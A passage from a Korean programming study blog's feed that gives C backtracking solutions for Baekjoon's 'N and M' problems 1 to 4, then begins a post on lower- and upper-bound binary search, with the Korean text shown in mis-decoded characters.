id="ë°±ì¤€-15649-Nê³¼-M-1"><a href="#ë°±ì¤€-15649-Nê³¼-M-1" class="headerlink" title="ë°±ì¤€ 15649 Nê³¼ M (1)"></a>ë°±ì¤€ 15649 Nê³¼ M (1)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15649">https://www.acmicpc.net/problem/15649</a></p></li><li><p>1ë¶€í„° Nê¹Œì§€ ìžì—°ìˆ˜ ì¤‘ì—ì„œ <strong>ì¤‘ë³µ ì—†ì´</strong> Mê°œë¥¼ ê³ ë¥¸ ìˆ˜ì—´. í•œ ë§ˆë””ë¡œ <code>nPm</code>ì„ êµ¬í•˜ëŠ” ë¬¸ì œ.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br></pre></td></tr></table></figure></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span>) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì¤‘ë³µì„ ìœ„í•´ ì‚¬ìš©í•œ <code>visit</code> ë°°ì—´ì€ <code>ê°’</code>ì´ ì‚¬ìš©í–ˆë‚˜ ì•ˆí–ˆë‚˜ë¥¼ íŒë‹¨í•˜ëŠ” ë°°ì—´ì´ë‹¤. (<code>ê°’</code>ì„ ì¸ë±ìŠ¤ë¡œ í™œìš©í•œë‹¤.) ìž…ë ¥ì´ 1ë¶€í„° ì‹œìž‘í•˜ê¸° ë•Œë¬¸ì— <code>visit</code> ë°°ì—´ ì¸ë±ìŠ¤ë¥¼ 1ë¶€í„° ì‚¬ìš©í•œë‹¤. ì§€ê¸ˆ ìƒê°í•´ë³´ë©´ checkì˜ ë„¤ì´ë°ì´ ì¢€ ë” ì–´ìš¸ë¦¬ëŠ” ê²ƒ ê°™ê¸°ë„ í•˜ë‹¤. ê°€ë…ì„±ì„ ìœ„í•˜ì—¬ bool íƒ€ìž…ìœ¼ë¡œ ì§€ì •í•˜ì˜€ë‹¤. falseë¼ë©´ ì‚¬ìš©ì„ í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì— <code>data</code> ë°°ì—´ì— ê°’ì„ ë„£ì–´ì£¼ê³  í•´ë‹¹ ê°’ì„ ì¸ë±ìŠ¤ë¡œ ê°€ì§€ëŠ” <code>visit</code> ë°°ì—´ì„ trueë¡œ ì„¸íŒ…í•œë‹¤. ê·¸ë¦¬ê³  ê·¸ ë‹¤ìŒ ìžì‹ ë…¸ë“œë¥¼ íƒìƒ‰í•œë‹¤. </p><p>ë§Œì•½ ìœ ë§í•˜ì§€ ì•Šë‹¤ë©´ <code>i++</code>ë¡œ ë‹¤ìŒ ë°˜ë³µë¬¸ì„ ëˆë‹¤. </p><p>depthê°€ mê³¼ ê°™ì„ ê²½ìš°ì—” íŠ¸ë¦¬ ëê¹Œì§€ ë‹¤ ë‚´ë ¤ê°”ê¸° ë•Œë¬¸ì— <code>data</code> ë°°ì—´ì´ ì¶œë ¥ëœë‹¤. ìžŠìœ¼ë©´ ì•ˆë˜ëŠ” ê²ƒì´ mì´ ì¶œë ¥í•´ì•¼í•  ìˆ«ìž ìˆ˜ì´ë‹¤. ì–´ì©Œë©´ ì´ ì¡°ê±´ì€ ë‹¹ì—°í•œ ê²ƒì¼ì§€ë„ ëª¨ë¥¸ë‹¤. í—·ê°ˆë¦¬ì§€ ë§ìž. </p><p>ì´ ë¬¸ì œë¥¼ ì´í•´í•˜ë©´ ë‹¤ìŒ 2, 3, 4ëŠ” ë§¤ìš° ì‰½ê²Œ í’€ì´í•  ìˆ˜ ìžˆë‹¤. ë‚´ê°€ ê·¸ëž¬ë‹¤.</p><h2 id="ë°±ì¤€-15650-Nê³¼-M-2"><a href="#ë°±ì¤€-15650-Nê³¼-M-2" class="headerlink" title="ë°±ì¤€ 15650 Nê³¼ M (2)"></a>ë°±ì¤€ 15650 Nê³¼ M (2)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15650">https://www.acmicpc.net/problem/15650</a></p></li><li><p>1ë¶€í„° Nê¹Œì§€ ìžì—°ìˆ˜ ì¤‘ì—ì„œ ì¤‘ë³µ ì—†ì´ Mê°œë¥¼ ê³ ë¥¸ ìˆ˜ì—´. ì¶”ê°€ë¡œ <strong>ì˜¤ë¦„ì°¨ìˆœ</strong>ì´ì–´ì•¼ í•¨.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br></pre></td></tr></table></figure></li><li><p>ì´ ì „ ë¬¸ì œì™€ ë‹¤ë¥´ê²Œ ì˜¤ë¦„ì°¨ìˆœì´ ì•„ë‹Œ ê²½ìš°ë©´ ì¶œë ¥ì„ í•˜ì§€ ì•ŠëŠ”ë‹¤.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span> &amp;&amp; pre &lt; i) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ ì „ ì½”ë“œì—ì„œ <code>pre &lt; i</code> ì¡°ê±´ì„ ì¶”ê°€í•´ì£¼ì—ˆë‹¤. ì´ë•Œ ì£¼ì˜í•´ì•¼í•  ì ì€ preê°€ ë“±ìž¥í–ˆê¸° ë•Œë¬¸ì— main í•¨ìˆ˜ì—ì„œ depth 1ë¶€í„° íƒìƒ‰í•œë‹¤. ì¦‰ data ë°°ì—´ì„ ì¸ë±ìŠ¤ 1ë¶€í„° ì‚¬ìš©í•œë‹¤. ê·¸ëž˜ì„œ ì¶œë ¥í•  ë•Œ <code>for (int i = 1; i &lt;= m; i++)</code> ì¡°ê±´ìœ¼ë¡œ í•´ì•¼í•œë‹¤.</p><h2 id="ë°±ì¤€-15651-Nê³¼-M-3"><a href="#ë°±ì¤€-15651-Nê³¼-M-3" class="headerlink" title="ë°±ì¤€ 15651 Nê³¼ M (3)"></a>ë°±ì¤€ 15651 Nê³¼ M (3)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></p></li><li><p>1ë¶€í„° Nê¹Œì§€ ìžì—°ìˆ˜ ì¤‘ì—ì„œ Mê°œë¥¼ ê³ ë¥¸ ìˆ˜ì—´. <strong>ì¤‘ë³µ í—ˆìš©</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p><code>Nê³¼ M (1)</code> ë¬¸ì œì™€ ë¹„êµí•´ì„œ ì¤‘ë³µì´ í—ˆìš©ë˜ì—ˆë‹¤. ì‚¬ì‹¤ìƒ ì´ ë¬¸ì œê°€ êµ¬í˜„í•˜ê¸° ê°€ìž¥ ì‰¬ìš¸ ê²ƒ ê°™ë‹¤.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            data[depth] = i;</span><br><span class="line">            DFS(depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì¡°ê±´ ì—†ì´ ëª¨ë“  ê²ƒì„ ë‹¤ ì™„ì „ížˆ íƒìƒ‰í•˜ê¸° ë•Œë¬¸ì— ë°±íŠ¸ëž˜í‚¹ ì•Œê³ ë¦¬ì¦˜ì€ ì‚¬ìš©ë˜ì§€ ì•Šì•˜ë‹¤. DFSë¡œ ì™„ì „íƒìƒ‰í•œë‹¤.</p><h2 id="ë°±ì¤€-15652-Nê³¼-M-4"><a href="#ë°±ì¤€-15652-Nê³¼-M-4" class="headerlink" title="ë°±ì¤€ 15652 Nê³¼ M (4)"></a>ë°±ì¤€ 15652 Nê³¼ M (4)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15652">https://www.acmicpc.net/problem/15652</a></p></li><li><p>1ë¶€í„° Nê¹Œì§€ ìžì—°ìˆ˜ ì¤‘ì—ì„œ Mê°œë¥¼ ê³ ë¥¸ ìˆ˜ì—´. ì¤‘ë³µ í—ˆìš©. <strong>ë¹„ë‚´ë¦¼ì°¨ìˆœ</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p>ê¸¸ì´ê°€ Kì¸ ìˆ˜ì—´ Aê°€ A1 â‰¤ A2 â‰¤ â€¦ â‰¤ AK-1 â‰¤ AKë¥¼ ë§Œì¡±í•˜ë©´, ë¹„ë‚´ë¦¼ì°¨ìˆœì´ë¼ê³  í•œë‹¤.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pre &lt;= i) &#123; <span class="comment">// ë¹„ë‚´ë¦¼ì°¨ìˆœ</span></span><br><span class="line">                data[depth] = i;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">   DFS(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nê³¼ M (2)ì—ì„œ ì˜¤ë¦„ì°¨ìˆœì„ êµ¬í˜„í–ˆë‹¤ë©´ ì‰½ê²Œ ìœ ë§í•œ ì¡°ê±´ì— ë¹„ë‚´ë¦¼ì°¨ìˆœì„ êµ¬í˜„í•  ìˆ˜ ìžˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://moz1e.tistory.com/15">https://moz1e.tistory.com/15</a> </li><li><a href="https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98">https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98</a></li><li><a href="https://www.acmicpc.net/board/view/53440">https://www.acmicpc.net/board/view/53440</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Baekjoon </tag>
            
            <tag> Recursion </tag>
            
            <tag> DFS </tag>
            
            <tag> Backtracking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Lower bound, Upper bound (Baekjoon 10816, C)</title>
      <link href="/230201-algorithm-upper_lower/"/>
      <url>/230201-algorithm-upper_lower/</url>
      
        <content type="html"><![CDATA[<ul><li><p><a href="https://jiravvit.github.io/230123-alrorithm-binsearch/">https://jiravvit.github.io/230123-alrorithm-binsearch/</a> </p></li><li><p>ìœ„ì˜ Binary Searchì—ì„œ íŒŒìƒë¨, ë”°ë¼ì„œ Lower Bound, Upper Bound ì•Œê³ ë¦¬ì¦˜ì€ ì •ë ¬ëœ ë°°ì—´ì— ëŒ€í•´ ì‚¬ìš©ì´ ê°€ëŠ¥í•¨</p></li><li><p><strong>Binary Search</strong>: ì›í•˜ëŠ” ê°’ keyë¥¼ ì°¾ëŠ” ê³¼ì •</p></li><li><p><strong>Lower bound</strong>: ì›í•˜ëŠ” ê°’ key ì´ìƒì´ ì²˜ìŒ ë‚˜ì˜¤ëŠ” ìœ„ì¹˜ë¥¼ ì°¾ëŠ” ê³¼ì •</p></li><li><p><strong>Upper bound</strong>: ì›í•˜ëŠ” ê°’ keyë¥¼ ì´ˆê³¼í•œ ê°’ì´ ì²˜ìŒ ë‚˜ì˜¤ëŠ” ìœ„ì¹˜ë¥¼ ì°¾ëŠ” ê³¼ì •</p></li><li><p>Binary SearchëŠ” ì›í•˜ëŠ” ê°’ keyê°€ ì•„ë‹ˆë©´ ë³´í†µ -1ì„ ë°˜í™˜í•¨.(ì´ ì „ ê²Œì‹œê¸€ êµ¬í˜„ì—ì„œëŠ” 0ì„ ë°˜í™˜í–ˆìŒ.) í•˜ì§€ë§Œ Lower boundì™€ Upper boundëŠ” ì–´ë–»ê²Œë“  ì ì ˆí•œ ìœ„ì¹˜ë¥¼ ë°˜í™˜í•¨.</p></li></ul><h2 id="Lower-Bound"><a href="#Lower-Bound" class="headerlink" title="Lower Bound"></a>Lower Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì›í•˜ëŠ” ê°’ key ì´ìƒì´ë©´ keyë„ í¬í•¨ì´ë‹¤. ì¤‘ë³µë˜ëŠ” key ì¤‘ì—ì„œ ê°€ìž¥ ìž‘ì€ ì¸ë±ìŠ¤ë¥¼ ê°€ì ¸ì˜¨ë‹¤. Binary search ì½”ë“œì—ì„œ ì¡°ê¸ˆë§Œ ë³€í˜•ì‹œì¼œì£¼ë©´ ëœë‹¤. </p><h2 id="Upper-Bound"><a href="#Upper-Bound" class="headerlink" title="Upper Bound"></a>Upper Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>low</code>, <code>high</code>, <code>mid</code>ëŠ” ëª¨ë‘ ì¸ë±ìŠ¤ì´ë‹¤.</p><p><code>key</code>ë³´ë‹¤ í° ì²« ë²ˆì§¸ ìœ„ì¹˜ë¥¼ ì°¾ì•„ì•¼ í•œë‹¤. <code>key</code>ê°€ <code>data[mid]</code>ë³´ë‹¤ ìž‘ìœ¼ë©´ <code>high</code>ë¥¼ <code>mid</code>ë¡œ ë‚´ë¦°ë‹¤. ê·¸ëŸ¼ ì „ì²´ì ì¸ ì¸ë±ìŠ¤ëŠ” ì™¼ìª½ìœ¼ë¡œ ì‚´ì§ ì¹˜ìš°ì¹œ í˜•íƒœì¼ ê²ƒì´ë‹¤.</p><p><code>key</code>ê°€ <code>data[mid]</code>ë³´ë‹¤ ê°’ê±°ë‚˜ í¬ë©´ <code>low = mid + 1</code>ì„ ìˆ˜í–‰í•œë‹¤. ì‰½ê²Œ ë§í•´ <code>mid</code> ê·¸ ë‹¤ìŒ ì¸ë±ìŠ¤ë¥¼ <code>low</code>ë¡œ ì§€ì •í•œë‹¤. </p><img src="/images/230201-algoritm-upper_lower/IMG_4027.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4028.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4029.png" width=500/><p>ê²€ì •ìƒ‰ì„ ë¨¼ì € ì½ê³  ë¹¨ê°„ìƒ‰ì„ ì½ìœ¼ë©´ ëœë‹¤. íŒŒëž€ìƒ‰ì€ ì°¸ê³ ì´ë‹¤.</p><h2 id="Example-ë°±ì¤€-10816-ìˆ«ìžì¹´ë“œ-2"><a href="#Example-ë°±ì¤€-10816-ìˆ«ìžì¹´ë“œ-2" class="headerlink" title="Example (ë°±ì¤€ 10816 